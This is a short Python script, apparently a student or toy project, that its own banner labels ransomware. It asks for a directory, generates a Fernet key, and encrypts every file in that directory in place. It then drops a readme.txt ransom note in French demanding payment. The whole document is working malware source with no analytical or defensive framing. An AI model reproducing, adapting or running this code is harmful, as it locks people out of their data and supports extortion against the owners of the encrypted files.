import imp
from art import * 
from termcolor import colored
import os 
from cryptography.fernet import Fernet


print(colored(text2art("Hello").center(60),"red"))
print(colored("ransomeware ".center(60),"blue"))


def generation_clef() :
    clef = Fernet.generate_key()
    with open ("clef.key","wb")as key_file:
        key_file.write(clef)

def lire_clef():
    return open("clef.key","rb").read()


def chiffrement(items,clef):
    f=Fernet(clef)
    for item in items :
        with open(item,"rb")as File :
            file_data=File.read()
        encypted_data=f.encrypt(file_data)
        with open(item,"wb")as File :
            File.write(encypted_data)
        


pwd=input("donner path : ")

items= os.listdir(pwd)

path = [str(pwd)+'/'+ item for item in items]
generation_clef()
clef=lire_clef()
chiffrement(path,clef)

with open (str(pwd)+"/"+"readme.txt","w") as file :
    file.write("Vous etes amenes a payer la rancon .... ")
